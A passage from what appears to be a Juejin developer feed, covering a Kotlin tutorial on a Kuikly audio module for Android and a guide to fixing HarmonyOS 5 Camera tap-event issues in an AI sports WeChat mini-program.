                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">第八篇：Kuikly基础之封装自定义模块（音频）</h2>
<p>之前为了让小青蛙能“呱”一声叫出来，我们走了条“野路子”：用一个看不见的<code>Video</code>组件来播放音频。虽然能用，但总感觉有点“名不正言不顺”，不够优雅，也埋下了隐患。</p>
<p>于是，我们决定对这个“野路子”进行改造，采用Kuikly的自定义模块机制，把它从一个“组件技巧”升级为一项独立的“模块能力”。整个过程不复杂，我们分三步走。</p>
<h3 data-id="heading-1">第一步：定义共享模块——AudioModule (shared)</h3>
<p>首先，在所有平台都能访问的<code>shared</code>端，我们定义一个<code>AudioModule</code>。它负责定义接口，比如“播放”或“停止”，但它自己不关心具体怎么实现。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: AudioModule.kt</span>

<span class="hljs-keyword">package</span> com.lifeiyu.singlefrog.modules
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.module.Module
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.nvi.serialization.json.JSONObject

<span class="hljs-comment">/**
 * 音频模块的共享部分，定义了跨平台使用的接口。
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AudioModule</span> : <span class="hljs-type">Module</span>() {
    <span class="hljs-comment">// 模块的唯一标识，平台端靠它来识别</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">moduleName</span><span class="hljs-params">()</span></span>: String { <span class="hljs-keyword">return</span> MODULE_NAME }

    <span class="hljs-comment">// 定义“播放”接口，通过 callNativeMethod 把任务派发给平台端</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">playAsset</span><span class="hljs-params">(assetPath: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">val</span> p = JSONObject(); p.put(<span class="hljs-string">"assetPath"</span>, assetPath)
        callNativeMethod(<span class="hljs-string">"playAsset"</span>, p, <span class="hljs-literal">null</span>)
    }

    <span class="hljs-comment">// 定义“停止”接口</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">stop</span><span class="hljs-params">()</span></span> { callNativeMethod(<span class="hljs-string">"stop"</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>) }

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 模块名，两端要保持一致，像一个约定好的暗号</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> MODULE_NAME = <span class="hljs-string">"HRAudioModule"</span>
    }
}
</code></pre>
<p>定义好后，得让每个页面都能用上它。所以我们在<code>BasePager</code>里把它注册成一个外部模块。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: BasePager.kt</span>

<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">import</span> com.lifeiyu.singlefrog.modules.AudioModule

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createExternalModules</span><span class="hljs-params">()</span></span>: Map&lt;String, Module&gt;? {
    <span class="hljs-keyword">val</span> m = hashMapOf&lt;String, Module&gt;()
    m[BridgeModule.MODULE_NAME] = BridgeModule()
    <span class="hljs-comment">// 把我们的音频模块也加进去</span>
    m[AudioModule.MODULE_NAME] = AudioModule()
    <span class="hljs-keyword">return</span> m
}
</code></pre>
<h3 data-id="heading-2">第二步：提供安卓端实现——KRAudioModule (Android)</h3>
<p><code>shared</code>端定义了接口，我们还需要在平台端提供具体的实现。在安卓这边，我们创建了<code>KRAudioModule</code>。</p>
<p>它继承<code>KuiklyRenderBaseModule</code>，通过重写<code>call</code>方法来响应来自<code>shared</code>端的调用。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: KRAudioModule.kt</span>

<span class="hljs-keyword">package</span> com.lifeiyu.singlefrog.module
<span class="hljs-keyword">import</span> android.media.MediaPlayer
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.render.android.export.KuiklyRenderBaseModule
<span class="hljs-comment">// ...</span>

<span class="hljs-comment">/**
 * 音频模块在安卓平台的具体实现。
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">KRAudioModule</span> : <span class="hljs-type">KuiklyRenderBaseModule</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> player: MediaPlayer? = <span class="hljs-literal">null</span>

    <span class="hljs-comment">// 在这里接收并处理来自shared端的调用</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">call</span><span class="hljs-params">(method: <span class="hljs-type">String</span>, params: <span class="hljs-type">String</span>?, cb: <span class="hljs-type">KuiklyRenderCallback</span>?)</span></span>: Any? = <span class="hljs-keyword">when</span>(method){
        <span class="hljs-string">"playAsset"</span> -&gt; { <span class="hljs-comment">// 实现“播放”</span>
            <span class="hljs-keyword">val</span> path = JSONObject(params ?: <span class="hljs-string">"{}"</span>).optString(<span class="hljs-string">"assetPath"</span>)
            <span class="hljs-keyword">val</span> context = context ?: <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
            <span class="hljs-comment">// 下面就是安卓原生播放音频的逻辑了</span>
            <span class="hljs-keyword">val</span> afd = context.assets.openFd(path)
            <span class="hljs-keyword">val</span> mp = player ?: MediaPlayer().also { player = it }
            mp.reset()
            mp.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
            afd.close()
            mp.isLooping = <span class="hljs-literal">false</span>
            mp.prepare()
            mp.start()
            <span class="hljs-literal">null</span>
        }
        <span class="hljs-string">"stop"</span> -&gt; { <span class="hljs-comment">// 实现“停止”</span>
            player?.let { <span class="hljs-keyword">if</span> (it.isPlaying) it.stop(); it.reset() }
            <span class="hljs-literal">null</span>
        }
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-literal">null</span>
    }

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 同样的模块名，确保能和shared端对上</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> MODULE_NAME = <span class="hljs-string">"HRAudioModule"</span>
    }
}
</code></pre>
<p>同样，这个实现也得在安卓项目里注册一下，这样系统才知道有这么个模块可用。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: KuiklyRenderActivity.kt</span>

<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">import</span> com.lifeiyu.singlefrog.module.KRAudioModule

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">registerExternalModule</span><span class="hljs-params">(kuiklyRenderExport: <span class="hljs-type">IKuiklyRenderExport</span>)</span></span> {
    <span class="hljs-comment">// ...</span>
    with(kuiklyRenderExport) {
        <span class="hljs-comment">// ...</span>
        <span class="hljs-comment">// 在这里注册，告诉系统 HRAudioModule 这个名称由 KRAudioModule 来实现</span>
        moduleExport(KRAudioModule.MODULE_NAME) { KRAudioModule() }
    }
}
</code></pre>
<h3 data-id="heading-3">第三步：在页面中使用模块</h3>
<p>准备工作都做好了，现在回到我们的<code>FrogMainPage</code>，看看如何使用这个新模块。过程非常直接。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: FrogMainPage.kt</span>

<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrogMainPage</span> : <span class="hljs-type">BasePager</span>() {
    <span class="hljs-comment">// 声明一个变量来持有音频模块的实例</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> audioModule: AudioModule

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">created</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.created()
        <span class="hljs-comment">// 页面创建时，通过 acquireModule 获取模块实例</span>
        audioModule = acquireModule&lt;AudioModule&gt;(AudioModule.MODULE_NAME)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">()</span></span>: ViewBuilder {
        <span class="hljs-comment">// ...</span>
        event {
            click {
                <span class="hljs-comment">// ...</span>
                <span class="hljs-comment">// 点击时，直接调用模块的接口</span>
                audioModule.playAsset(<span class="hljs-string">"audio/frog_sound.mp3"</span>)
            }
        }
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>现在，页面逻辑变得清爽多了。没有了隐藏的<code>Video</code>和复杂的<code>playControl</code>，只剩下一句清晰的方法调用。</p>
<h3 data-id="heading-4">小结：从“野路子”到“正规军”</h3>
<p>这次重构，我们把音频播放从一个依赖UI组件的“野路子”，转变成了一个独立的、平台无关的“模块能力”。这不仅仅是代码写法的改变，更是一种架构思维的进步。</p>
<ul>
<li><strong>职责更清晰</strong>：<code>shared</code>端定义能力，<code>platform</code>端负责实现，页面只管使用。</li>
<li><strong>代码更干净</strong>：页面不再关心音频是怎么播放的，耦合度大大降低。</li>
<li><strong>扩展性更强</strong>：未来想增加预加载、管理多个音效，都只需要在模块内部做文章，页面代码基本不用动。</li>
</ul>
<p>现在，我们项目里那声清脆的“呱”，背后有了一个更稳固的实现方式。感觉好多了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI运动小程序鸿蒙平台适配指南]]></title>    <link>https://juejin.cn/post/7575748159608635418</link>    <guid>https://juejin.cn/post/7575748159608635418</guid>    <pubDate>2025-11-24T04:03:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575748159608635418" data-draft-id="7575533124878778395" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI运动小程序鸿蒙平台适配指南"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T04:03:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="云智科技的技术小铺"/> <meta itemprop="url" content="https://juejin.cn/user/2491969751759002"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI运动小程序鸿蒙平台适配指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2491969751759002/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    云智科技的技术小铺
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:03:13.000Z" title="Mon Nov 24 2025 04:03:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>鸿蒙5的首版发布距现在已快满一年了，同时伴随着华为终端芯片制造的突破，搭载有HarmonyOS5的终端及用户的保有量在不断的上升，各大厂商的APP也在逐渐适配鸿蒙生态，微信小程序生态也在逐渐适配成熟，移动端适配HarmonyOS生态已势在必行。今天我们就结合我们一段时间以来「Ai乐运动」用户的反馈、实测验证，来聊聊AI运动小程序在鸿蒙端的适配。
<strong>注：本文主要介绍适配鸿蒙5以及后的HarmonyOS Next纯血版鸿蒙版本，HarmonyOS 4及以前的版本因为还兼容Android生态、微信小程序运行时也与Android版本无差异，所以无需特别适配。</strong>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/153034e9900745dc973dcd9e5354ce3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5pm656eR5oqA55qE5oqA5pyv5bCP6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561792&amp;x-signature=0ioYfJrPlENrJ95RyouqMl4%2FI9o%3D" alt="d52a2834349b033b620dd46d5e0782dcd739bddc" loading="lazy"/></p>
</blockquote>
<h2 data-id="heading-0">一、AI运动识别插件在鸿蒙5的实测表现</h2>
<p>使用版<code>v8.0.11</code>微信分别在<code>Harmony5.0.1</code>和<code>Harmony5.1.0</code>的实际测试结果如下：</p>













































<table><thead><tr><th align="center">功能</th><th align="center">功能表现</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">识别引擎ve1</td><td align="center">正常</td><td align="center"><em>但精度不佳</em>，与MTK芯片问题一致，开启<strong>增强模式</strong>即可解决</td></tr><tr><td align="center">识别引擎ve1，增强模式</td><td align="center">正常</td><td align="center">Harmony5+建议识别模式</td></tr><tr><td align="center">识别引擎ve1</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">骨骼图绘制</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">资态识别</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">运动识别检测</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">运动自定义扩展</td><td align="center">正常</td><td align="center"/></tr></tbody></table>
<blockquote>
<p>测试使用时的插件版本为当前最新版本<code>1.5.8</code>，从结果看<strong>AI运动识别插件</strong>的功能在鸿蒙5的表现不存在兼容性问题，可以正常使用。</p>
</blockquote>
<h2 data-id="heading-1">二、AI运动小程序在鸿蒙5的兼容性问题</h2>
<p>使用微信版本<code>v8.0.11</code>分别在<code>Harmony5.0.1</code>用<code>Harmony5.1.0</code>测试兼容问题主要表现在小程序的<code>Camera组件</code>，问题为<code>Camera</code>的非原生事件，即<code>Web</code>渲染层事件如<code>tap</code>、<code>touch___</code>相关事件完全不触发或偶尔触发但是没有冒泡向上传播，代码如下：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"human-detection"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"videoStyles"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onWrapperClick"</span>&gt;</span>
		<span class="hljs-comment">&lt;!--原生initdone、error事件能正常触发，但是渲染层事件tap不触发，或者偶尔触发但不冒泡--&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">camera</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span> <span class="hljs-attr">flash</span>=<span class="hljs-string">"off"</span> <span class="hljs-attr">:device-position</span>=<span class="hljs-string">"deviceKey"</span>
			<span class="hljs-attr">resolution</span>=<span class="hljs-string">"medium"</span> <span class="hljs-attr">frame-size</span>=<span class="hljs-string">"small"</span> @<span class="hljs-attr">initdone</span>=<span class="hljs-string">"onCameraReady"</span> @<span class="hljs-attr">error</span>=<span class="hljs-string">"onCameraError"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onCameraClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">camera</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>如果您的<code>AI运动小程序</code>依赖<code>Camera</code>组件的非原生事件来交互，如全屏模式下点击组件打开操作菜单等，在小程序运行时彻底修复上述问题之前，可以考虑先采用在<code>Camera</code>组件覆盖一个一样大小、透明的非原生组件如<code>view</code>来解决此问题，代码如何下：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"human-detection"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"videoStyles"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onWrapperClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">camera</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span> <span class="hljs-attr">flash</span>=<span class="hljs-string">"off"</span> <span class="hljs-attr">:device-position</span>=<span class="hljs-string">"deviceKey"</span>
			<span class="hljs-attr">resolution</span>=<span class="hljs-string">"medium"</span> <span class="hljs-attr">frame-size</span>=<span class="hljs-string">"small"</span> @<span class="hljs-attr">initdone</span>=<span class="hljs-string">"onCameraReady"</span> @<span class="hljs-attr">error</span>=<span class="hljs-string">"onCameraError"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onCameraClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">camera</span>&gt;</span>
		<span class="hljs-comment">&lt;!--增加一个遮罩层来承担交互，保证非原生事件能正常触发--&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hramony-fix"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span>{
	<span class="hljs-title function_">data</span>(<span class="hljs-params"/>){
		<span class="hljs-keyword">return</span> {};
	},
	<span class="hljs-attr">methods</span>:{
		<span class="hljs-title function_">onCameraClick</span>(<span class="hljs-params">e</span>){
			<span class="hljs-comment">//不会触发</span>
		},
		<span class="hljs-title function_">onWrapperClick</span>(<span class="hljs-params">e</span>){
			<span class="hljs-comment">//修补可以正常触发</span>
		}
	}
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-2">三、在纯血鸿蒙下的适配指引</h2>
<ul>
<li>3.1、将AI运动识别插件升级到最新版本，并为纯血鸿蒙版本的用户开启<code>增强模式</code>。</li>
<li>3.2、提示或调用API引导用户升级到最新版本的微信。</li>
<li>3.3、若存在依赖<code>Camera</code>组件非原生事件交互的问题，可使用上述临时方案修复交互。</li>
</ul>
<blockquote>
<p>AI运动小程序在纯血鸿蒙下的适配就为您介绍到这，若有其它的适配场景我们继续为您分享，欢迎关注...</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea4dc4891e3440d89f20a8fb35f6f6ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5pm656eR5oqA55qE5oqA5pyv5bCP6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561792&amp;x-signature=9%2B8UV8crtIc6HxRPdVmg%2FVIFYmQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go ants pool 协程池学习笔记]]></title>    <link>https://juejin.cn/post/7575757258833477658</link>    <guid>https://juejin.cn/post/7575757258833477658</guid>    <pubDate>2025-11-24T04:54:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833477658" data-draft-id="7575748159608684570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go ants pool 协程池学习笔记 "/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2025-11-24T04:54:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户722786812344"/> 